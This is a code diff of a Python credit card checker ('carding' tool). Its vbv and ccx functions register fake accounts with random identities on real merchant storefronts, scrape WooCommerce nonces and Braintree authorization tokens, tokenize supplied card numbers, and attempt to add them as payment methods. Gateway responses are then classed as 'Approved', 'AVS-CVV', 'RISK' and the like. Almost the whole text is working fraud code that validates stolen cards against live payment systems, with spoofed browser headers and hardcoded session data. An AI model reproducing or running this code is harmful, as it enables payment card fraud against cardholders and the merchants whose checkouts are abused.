@@ -1189,7 +1189,7 @@ def vbv(ccx):
 		with open('gates.json', 'r') as file:
 			json_dataa = json.load(file)
 		cookies = {
-		    'PHPSESSID': 'f4fc65f622f00d6f3203066dc890bd89'
+		    'PHPSESSID': 'b3a39ba6c229732bbb912287ca05d150',
 		}
 		headers = {
 		    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
@@ -1370,52 +1370,53 @@ def vbv(ccx):
 		au=(json_data['up']['au'])
 		ref=(json_data['up']['re'])
 		headers = {
-		    'authority': 'payments.braintree-api.com',
 		    'accept': '*/*',
-		    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
-		    'authorization': f'Bearer {au}',
-		    'braintree-version': '2018-05-10',
-		    'content-type': 'application/json',
-		    'origin': 'https://assets.braintreegateway.com',
-		    'referer': 'https://assets.braintreegateway.com/',
-		    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-		    'sec-ch-ua-mobile': '?1',
-		    'sec-ch-ua-platform': '"Android"',
-		    'sec-fetch-dest': 'empty',
-		    'sec-fetch-mode': 'cors',
-		    'sec-fetch-site': 'cross-site',
-		    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
+    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
+	'authorization': f'Bearer {au}',
+    'braintree-version': '2018-05-10',
+    'content-type': 'application/json',
+    'origin': 'https://assets.braintreegateway.com',
+    'priority': 'u=1, i',
+    'referer': 'https://assets.braintreegateway.com/',
+    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'cross-site',
+    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
 }
 		json_data = {
-		    'clientSdkMetadata': {
+		'clientSdkMetadata': {
         'source': 'client',
         'integration': 'custom',
-        'sessionId': '4dca19f1-754d-4e79-a20f-b0dd2d6dbf58',
-		    },
-		    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
-		    'variables': {
-		        'input': {
-		            'creditCard': {
-		                'number': n,
-		                'expirationMonth': '12',
-		                'expirationYear': '2029',
-		                'cvv': '982',
-		            },
-		            'options': {
-		                'validate': False,
-		            },
-		        },
-		    },
-		    'operationName': 'TokenizeCreditCard',
-		}
+        'sessionId': 'e1e855be-7616-41cb-b1a0-c8f33d047f51',
+    },
+    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
+    'variables': {
+        'input': {
+            'creditCard': {
+                'number': n,
+                'expirationMonth': '02',
+                'expirationYear': '2028',
+                'cvv': '943',
+            },
+            'options': {
+                'validate': False,
+            },
+        },
+    },
+    'operationName': 'TokenizeCreditCard',
+}
+
 		response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
 		try:
 			tok = response.json()['data']['tokenizeCreditCard']['token']
 		except:
 			get_ref()
 		headers = {
-		    'accept': '*/*',
-    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
+	'accept': '*/*',
+	'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
     'content-type': 'application/json',
     'origin': 'https://www.sportfish.co.uk',
     'priority': 'u=1, i',
@@ -1439,10 +1440,10 @@ def vbv(ccx):
     'browserTimeZone': -180,
     'deviceChannel': 'Browser',
     'additionalInfo': {
-        'ipAddress': '197.63.41.253',
+        'ipAddress': '197.63.55.89',
         'billingLine1': '10080 Okeechobee Blvd',
         'billingLine2': '',
-        'billingCity': 'West Palm Beach',
+        'billingCity': 'Raleigh',
         'billingState': '',
         'billingPostalCode': '33411-1482',
         'billingCountryCode': 'US',
@@ -1452,12 +1453,12 @@ def vbv(ccx):
     },
     'challengeRequested': True,
     'bin': '440393',
-    'dfReferenceId': ref,
+    'dfReferenceId': '0_eaf3f75b-22c7-4003-8607-33bbd8441f1d',
     'clientMetadata': {
         'requestedThreeDSecureVersion': '2',
         'sdkVersion': 'web/3.94.0',
-        'cardinalDeviceDataCollectionTimeElapsed': 273,
-        'issuerDeviceDataCollectionTimeElapsed': 387,
+        'cardinalDeviceDataCollectionTimeElapsed': 440,
+        'issuerDeviceDataCollectionTimeElapsed': 739,
         'issuerDeviceDataCollectionResult': True,
     },
     'authorizationFingerprint': au,
@@ -1469,7 +1470,7 @@ def vbv(ccx):
         'source': 'client',
         'integration': 'custom',
         'integrationType': 'custom',
-        'sessionId': '4dca19f1-754d-4e79-a20f-b0dd2d6dbf58',
+        'sessionId': 'e1e855be-7616-41cb-b1a0-c8f33d047f51',
     },
 }
 		response = requests.post(
@@ -3362,176 +3363,297 @@ def ccx(ccx):
 	import string
 	import base64
 	from user_agent import generate_user_agent
-	ccx = ccx.strip()
-	parts = re.split(r'[ |/]', ccx)
-	c = parts[0]
-	mm = parts[1]
-	ex = parts[2]
-	cvc = parts[3]
-	try:
-	    yy = ex[2] + ex[3]
-	    if '2' in ex[3] or '1' in ex[3]:
-	        yy = ex[2] + '7'
-	    else:
-	        pass
-	except:
-	    yy = ex[0] + ex[1]
-	    if '2' in ex[1] or '1' in ex[1]:
-	        yy = ex[0] + '7'
-	    else:
-	        pass
-	r=requests.session()
+	ccx=ccx.strip()
+	n = ccx.split("|")[0]
+	mm = ccx.split("|")[1]
+	yy = ccx.split("|")[2]
+	cvc = ccx.split("|")[3]
+	if "20" in yy:#Mo3gza
+		yy = yy.split("20")[1]
+		
 	user = user_agent.generate_user_agent()
-	username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
-	email = f"{username}@gmail.com"
-	user = generate_user_agent()
+		
 	r = requests.session()
+	
+	r.follow_redirects = True
+	
+	r.verify = False
 
 
-	headers={
-'User-Agent': user,
-}
+		
+	def generate_full_name():
+				first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", 
+			                   "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan",
+			                   "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa",
+			                   "Leila", "Kareem", "Hala", "Karim", "Nabil", "Samir", "Habiba", "Dina", "Youssef", "Rasha",
+			                   "Majid", "Nabil", "Nadia", "Sami", "Samar", "Amal", "Iman", "Tamer", "Fadi", "Ghada",
+			                   "Ali", "Yasmin", "Hassan", "Nadia", "Farah", "Khalid", "Mona", "Rami", "Aisha", "Omar",
+			                   "Eman", "Salma", "Yahya", "Yara", "Husam", "Diana", "Khaled", "Noura", "Rami", "Dalia",
+			                   "Khalil", "Laila", "Hassan", "Sara", "Hamza", "Amina", "Waleed", "Samar", "Ziad", "Reem",
+			                   "Yasser", "Lina", "Mazen", "Rana", "Tariq", "Maha", "Nasser", "Maya", "Raed", "Safia",
+			                   "Nizar", "Rawan", "Tamer", "Hala", "Majid", "Rasha", "Maher", "Heba", "Khaled", "Sally"] # List of first names
+			    
+				last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown",
+			                   "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White",
+			                   "Ahmed", "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar",
+			                   "Gomez", "Lopez", "Hernandez", "Gonzalez", "Perez", "Sanchez", "Ramirez", "Torres", "Flores", "Rivera",
+			                   "Silva", "Reyes", "Alvarez", "Ruiz", "Fernandez", "Valdez", "Ramos", "Castillo", "Vazquez", "Mendoza",
+			                   "Bennett", "Bell", "Brooks", "Cook", "Cooper", "Clark", "Evans", "Foster", "Gray", "Howard",
+			                   "Hughes", "Kelly", "King", "Lewis", "Morris", "Nelson", "Perry", "Powell", "Reed", "Russell",
+			                   "Scott", "Stewart", "Taylor", "Turner", "Ward", "Watson", "Webb", "White", "Young"] # List of last names
+			    
+				full_name = random.choice(first_names) + " " + random.choice(last_names)
+				first_name, last_name = full_name.split()
 
-	rrr=r.get("https://www.ecosmetics.com/my-account/add-payment-method/",headers=headers)
-	login=re.findall(r'name="woocommerce-register-nonce" value="(.*?)"',rrr.text)[0]
+				return first_name, last_name
+			
+	def generate_address():
+		cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego", "Dallas", "San Jose"]
+		states = ["NY", "CA", "IL", "TX", "AZ", "PA", "TX", "CA", "TX", "CA"]
+		streets = ["Main St", "Park Ave", "Oak St", "Cedar St", "Maple Ave", "Elm St", "Washington St", "Lake St", "Hill St", "Maple St"]
+		zip_codes = ["10001", "90001", "60601", "77001", "85001", "19101", "78201", "92101", "75201", "95101"]
 
+		city = random.choice(cities)
+		state = states[cities.index(city)]
+		street_address = str(random.randint(1, 999)) + " " + random.choice(streets)
+		zip_code = zip_codes[states.index(state)]
 
-
+		return city, state, street_address, zip_code
+			
+			# Testing the library:
+	first_name, last_name = generate_full_name()
+	city, state, street_address, zip_code = generate_address()
+			
+			
+			
+			
+			
+	def generate_random_account():
+		name = ''.join(random.choices(string.ascii_lowercase, k=20))
+		number = ''.join(random.choices(string.digits, k=4))
+				
+		return f"{name}{number}@gmail.com"
+	acc = (generate_random_account())
+			
+		
+	def username():
+		name = ''.join(random.choices(string.ascii_lowercase, k=20))
+		number = ''.join(random.choices(string.digits, k=20))
+				
+		return f"{name}{number}"
+	username = (username())
+			
+			
+			
+	def num():
+		number = ''.join(random.choices(string.digits, k=7))
+		return f"303{number}"
+	num = (num())
+			
+			
+	def generate_random_code(length=32):
+		letters_and_digits = string.ascii_letters + string.digits
+		return ''.join(random.choice(letters_and_digits) for _ in range(length))
+			
+	corr = generate_random_code()
+			
+	sess = generate_random_code()
+			
+		
 	
 	
-
-
-
-
-
-
-
-
-	headers={
-'User-Agent': user,
+	
+	headers = {
+	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
+    'priority': 'u=0, i',
+    'referer': 'https://shop.trifectanutrition.com/sign-in/',
+    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': user,
 }
-
+	
+	response = r.get('https://shop.trifectanutrition.com/sign-up/', headers=headers)
+	
+	headers = {
+	    'accept': '*/*',
+    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
+    'content-type': 'application/json',
+    'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjE3MjQwNDciLCJhcCI6IjExMTczMzIxMDIiLCJpZCI6ImJkZDM1NWM4YWYyZjgzMDQiLCJ0ciI6ImZhM2I4ZDhmM2RlYTM0NDg1NDczMDkyZDIwYjIxMTFlIiwidGkiOjE3MjQxOTU1MDk1OTl9fQ==',
+    'origin': 'https://shop.trifectanutrition.com',
+    'priority': 'u=1, i',
+    'referer': 'https://shop.trifectanutrition.com/sign-up/',
+    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-origin',
+    'traceparent': '00-fa3b8d8f3dea34485473092d20b2111e-bdd355c8af2f8304-01',
+    'tracestate': '1724047@nr=0-1-1724047-1117332102-bdd355c8af2f8304----1724195509599',
+    'user-agent': user,
+}
+	
+	json_data = {
+    'email': acc,
+    'password': 'a5520055',
+}
+	
+	response = r.post('https://shop.trifectanutrition.com/wp-json/tf/v1/fb/user/create/email', headers=headers, json=json_data)
+	
+	headers = {
+	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
+    'priority': 'u=0, i',
+    'referer': 'https://shop.trifectanutrition.com/my-account/account-settings/',
+    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': user,
+}
+	
+	response = r.get('https://shop.trifectanutrition.com/my-account/edit-address/billing/', cookies=r.cookies, headers=headers)
+	
+	address = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', response.text).group(1)
+	
+	
+	headers = {
+	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
+    'cache-control': 'max-age=0',
+    'content-type': 'application/x-www-form-urlencoded',
+    'origin': 'https://shop.trifectanutrition.com',
+    'priority': 'u=0, i',
+    'referer': 'https://shop.trifectanutrition.com/my-account/edit-address/billing/',
+    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+	'user-agent': user,
+	}
+	
 	data = {
-    'email': email,
-    'password': email,
-    'wc_order_attribution_source_type': 'typein',
-    'wc_order_attribution_referrer': '(none)',
-    'wc_order_attribution_utm_campaign': '(none)',
-    'wc_order_attribution_utm_source': '(direct)',
-    'wc_order_attribution_utm_medium': '(none)',
-    'wc_order_attribution_utm_content': '(none)',
-    'wc_order_attribution_utm_id': '(none)',
-    'wc_order_attribution_utm_term': '(none)',
-    'wc_order_attribution_utm_source_platform': '(none)',
-    'wc_order_attribution_utm_creative_format': '(none)',
-    'wc_order_attribution_utm_marketing_tactic': '(none)',
-    'wc_order_attribution_session_entry': 'https://www.ecosmetics.com/my-account/add-payment-method/',
-    'wc_order_attribution_session_start_time': '2024-08-02 22:08:23',
-    'wc_order_attribution_session_pages': '1',
-    'wc_order_attribution_session_count': '1',
-    'wc_order_attribution_user_agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
-    'woocommerce-register-nonce': login,
-    '_wp_http_referer': '/my-account/add-payment-method/',
-    'register': 'Register',
-}
-
-
-	response = r.post('https://www.ecosmetics.com/my-account/add-payment-method/', headers=headers, data=data)
-
-
-
-
-
-	headers={
-'User-Agent': user,
-}
-
-	 
-	addadres = r.get('https://www.ecosmetics.com/my-account/edit-address/billing/', cookies=r.cookies, headers=headers)
-	
-	 
-	address = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', addadres.text).group(1)
-	print(address)
-
-
-
-
-
-
-	headers={
-'User-Agent': user,
-}
-
-	data = {
-    'billing_first_name': 'Hussein',
-    'billing_last_name': 'Alfuraijii ',
-    'billing_company': '',
+    'billing_first_name': first_name,
+    'billing_last_name': last_name,
     'billing_country': 'US',
-    'billing_address_1': '3480 Granada Ave',
+    'billing_address_1': street_address,
     'billing_address_2': '',
-    'billing_city': 'Los Angeles ',
-    'billing_state': 'CA',
-    'billing_postcode': '90001',
-    'billing_phone': '3153153152',
-    'billing_email': email,
-    'save_address': 'Save address',
+    'billing_city': city,
+    'billing_state': state,
+    'billing_postcode': zip_code,
+    'billing_phone': num,
+    'billing_email': acc,
     'woocommerce-edit-address-nonce': address,
     '_wp_http_referer': '/my-account/edit-address/billing/',
     'action': 'edit_address',
+    'save_address': 'Save address',
 }
-
-	response = r.post('https://www.ecosmetics.com/my-account/edit-address/billing/', headers=headers, data=data)
 	
-
-
-
-
-
-
-
-	headers={
-'User-Agent': user,
-}
-
-	rrr=r.get("https://www.ecosmetics.com/my-account/add-payment-method/",headers=headers)
-	nonce = re.findall(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"',rrr.text)[0]
-	aut=rrr.text.split(r'var wc_braintree_client_token')[1].split('"')[1]
-	base4=str(base64.b64decode(aut))
-	auth= base4.split('"authorizationFingerprint":')[1].split('"')[1]
-
-
-
-
-
+	response = r.post('https://shop.trifectanutrition.com/my-account/edit-address/billing/', cookies=r.cookies, headers=headers, data=data)
+	
+	
+	
 	headers = {
-    'authority': 'payments.braintree-api.com',
-    'accept': '*/*',
-    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-	'authorization': f'Bearer {auth}',
+	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
+    'priority': 'u=0, i',
+    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+	    'user-agent': user,
+	}
+	
+	response = r.get('https://shop.trifectanutrition.com/my-account/add-payment-method', cookies=r.cookies, headers=headers)
+	
+	add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
+	
+	client = re.search(r'client_token_nonce":"([^"]+)"', response.text).group(1)
+	
+	
+	
+	headers = {
+	    'accept': '*/*',
+    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
+    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+    'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjE3MjQwNDciLCJhcCI6IjExMTczMzIxMDIiLCJpZCI6ImJkOWZhODI1OTA4N2JmM2QiLCJ0ciI6ImM4ZmUxODU3ZDQ2OWE4M2E4MmExNTcxOTY0ZDQ1YTZjIiwidGkiOjE3MjQxOTU1NjE2NzR9fQ==',
+    'origin': 'https://shop.trifectanutrition.com',
+    'priority': 'u=1, i',
+    'referer': 'https://shop.trifectanutrition.com/my-account/add-payment-method/',
+    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-origin',
+    'traceparent': '00-c8fe1857d469a83a82a1571964d45a6c-bd9fa8259087bf3d-01',
+    'tracestate': '1724047@nr=0-1-1724047-1117332102-bd9fa8259087bf3d----1724195561674',
+    'user-agent': user,
+}
+		
+	data = {
+    'action': 'wc_braintree_credit_card_get_client_token',
+    'nonce': client,
+}
+		
+	response = r.post('https://shop.trifectanutrition.com/wordpress/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
+	
+	enc = response.json()['data']
+	
+	dec = base64.b64decode(enc).decode('utf-8')
+	
+	au=re.findall(r'"authorizationFingerprint":"(.*?)"',dec)[0]
+	
+	
+		
+	headers = {
+		    'accept': '*/*',
+    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
+    'authorization': f'Bearer {au}',
     'braintree-version': '2018-05-10',
     'content-type': 'application/json',
     'origin': 'https://assets.braintreegateway.com',
+    'priority': 'u=1, i',
     'referer': 'https://assets.braintreegateway.com/',
-    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
     'sec-fetch-dest': 'empty',
     'sec-fetch-mode': 'cors',
     'sec-fetch-site': 'cross-site',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+    'user-agent': user,
 }
-
+		
 	json_data = {
-    'clientSdkMetadata': {
+		    'clientSdkMetadata': {
         'source': 'client',
         'integration': 'custom',
-        'sessionId': 'ae0e96cd-7aa2-418c-8fba-6627701d117c',
+        'sessionId': '95a6ff57-7691-4527-9e6a-dc6066499130',
     },
     'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
     'variables': {
         'input': {
             'creditCard': {
-                'number': c,
+                'number': n,
                 'expirationMonth': mm,
                 'expirationYear': yy,
                 'cvv': cvc,
@@ -3543,43 +3665,60 @@ def ccx(ccx):
     },
     'operationName': 'TokenizeCreditCard',
 }
-
-
+		
 	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
-
-
-	tok=(response.json()['data']['tokenizeCreditCard']['token'])
-
-
-
-
-
-	headers={
-'User-Agent': user,
+		
+	
+	try:
+		tok = response.json()['data']['tokenizeCreditCard']['token']
+	except:
+		return
+		
+	
+	
+	headers = {
+	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
+    'cache-control': 'max-age=0',
+    'content-type': 'application/x-www-form-urlencoded',
+    'origin': 'https://shop.trifectanutrition.com',
+    'priority': 'u=0, i',
+    'referer': 'https://shop.trifectanutrition.com/my-account/add-payment-method/',
+    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': user,
 }
 
+		
 	data = {
-    'payment_method': 'braintree_cc',
-    'braintree_cc_nonce_key': tok,
-    'braintree_cc_device_data': '{"device_session_id":"aa402142489e8b963c861d5042544862","fraud_merchant_id":null,"correlation_id":"1d8424a02ce5556a6edb90ee54425d39"}',
-    'braintree_cc_3ds_nonce_key': '',
-    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/8ddh6wj6qwvpbswt/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/8ddh6wj6qwvpbswt"},"merchantId":"8ddh6wj6qwvpbswt","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"applePayWeb":{"countryCode":"US","currencyCode":"USD","merchantIdentifier":"8ddh6wj6qwvpbswt","supportedNetworks":["visa","mastercard","amex","discover"]},"kount":{"kountMerchantId":null},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["MasterCard","Visa","Discover","JCB","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"androidPay":{"displayName":"OnCore Golf Technology, Inc","enabled":true,"environment":"production","googleAuthorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjI0MjcwNzAsImp0aSI6IjI3MzdhZGQ4LTk4ODQtNGYwYy04MzUwLTM4ZTNiZmZkMGI2YiIsInN1YiI6IjhkZGg2d2o2cXd2cGJzd3QiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjhkZGg2d2o2cXd2cGJzd3QiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJ0b2tlbml6ZV9hbmRyb2lkX3BheSIsIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.UFv3fsXi9wDJHfsZLJtfT-sQ59bpwfbPEy1I5HsvKxUYBp7CkUioTb0qG_IL7lZzcws_GfDBZ8D8CsdDWOujIQ","paypalClientId":"ARQ5EcBqMlYzZ9VRGrLp0uc26enUFNE7A8H47P5HokLSitrS1CaPGUy-zp4QS0EN-znueuESVGGRUfFu","supportedNetworks":["visa","mastercard","amex","discover"]},"payWithVenmo":{"merchantId":"3347590979694625451","accessToken":"access_token$production$8ddh6wj6qwvpbswt$c4f366f69f3f181ca36bc6c57195c1f7","environment":"production","enrichedCustomerDataEnabled":false},"paypalEnabled":true,"paypal":{"displayName":"OnCore Golf Technology, Inc","clientId":"ARQ5EcBqMlYzZ9VRGrLp0uc26enUFNE7A8H47P5HokLSitrS1CaPGUy-zp4QS0EN-znueuESVGGRUfFu","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"oncoregolftechnologyinc_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
-    'woocommerce-add-payment-method-nonce': nonce,
+    'payment_method': 'braintree_credit_card',
+    'wc-braintree-credit-card-card-type': 'master-card',
+    'wc-braintree-credit-card-3d-secure-enabled': '',
+    'wc-braintree-credit-card-3d-secure-verified': '',
+    'wc-braintree-credit-card-3d-secure-order-total': '0.00',
+    'wc_braintree_credit_card_payment_nonce': tok,
+    'wc_braintree_device_data': '',
+    'wc-braintree-credit-card-tokenize-payment-method': 'true',
+    'woocommerce-add-payment-method-nonce': add_nonce,
     '_wp_http_referer': '/my-account/add-payment-method/',
     'woocommerce_add_payment_method': '1',
 }
-
-
-	response = r.post('https://www.ecosmetics.com/my-account/add-payment-method/', headers=headers, data=data)
-
-
-
-
-
-
+		
+	response = r.post('https://shop.trifectanutrition.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers, data=data)
+				
+			
+		
+		
+		
 	text = response.text
 		
-	pattern = r'Reason: (.+?)\s*</li>'
+	pattern = r'Status code (.*?)\s*</li>'
 		
 	match = re.search(pattern, text)
 	if match:
@@ -3587,33 +3726,13 @@ def ccx(ccx):
 		if 'risk_threshold' in text:
 			result = "RISK: Retry this BIN later."
 	else:
-		if 'added' in text or 'Payment method successfully added.' in text:
-			result = "Approved ✅"
-			return result
+		if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
+			result = "1000: Approved"
 		else:
-			try:
-				result = text.split('Status code ')[1].split('<')[0]
-			except:
-				try:
-					result = match
-				except:
-					result = 'Unknow Response'
-
+			result = "Error"
 	
-	if 'risk_threshold' in result:
-			return "RISK: Retry this BIN later."
-	elif 'You cannot add a new payment method so soon after the previous one' in result:
-		    return "Please wait for 20 seconds."
-	elif 'Nice! New payment method added' in result or 'Payment method successfully added.' in result:
-		    return 'Approved ✅'
-	elif 'Duplicate card exists in the vault.' in result:
-		    return 'Duplicate'
-	elif "avs: Gateway Rejected: avs" in result or "avs_and_cvv: Gateway Rejected: avs_and_cvv" in result or "cvv: Gateway Rejected: cvv" in result:
-		    return 'AVS-CVV'
-	elif "Invalid postal code" in result or "CVV." in result:
-		    return 'Invalid postal code'
-	elif not re.search(r'[A-Za-z]', result) and not re.search(r'[0-9]', result):
-		    return 'Approved'
+	if 'funds' in result or 'added' in result or 'FUNDS' in result or 'CHARGED' in result or 'Funds' in result or 'avs' in result or 'postal' in result or 'approved' in result or 'Nice!' in result or 'Approved' in result or 'cvv: Gateway Rejected: cvv' in result or 'does not support this type of purchase.' in result or 'Duplicate' in result or 'Successful' in result or 'Authentication Required' in result or 'successful' in result or 'Thank you' in result or 'confirmed' in result or 'successfully' in result or 'INVALID_BILLING_ADDRESS' in result:
+			return 'Approved'
 	else:
 		return result
 def pp(card):
@@ -4280,7 +4399,7 @@ def au(ccx):
 	cvc = ccx.split("|")[3]
 	if "20" in yy:
 		yy = yy.split("20")[1]
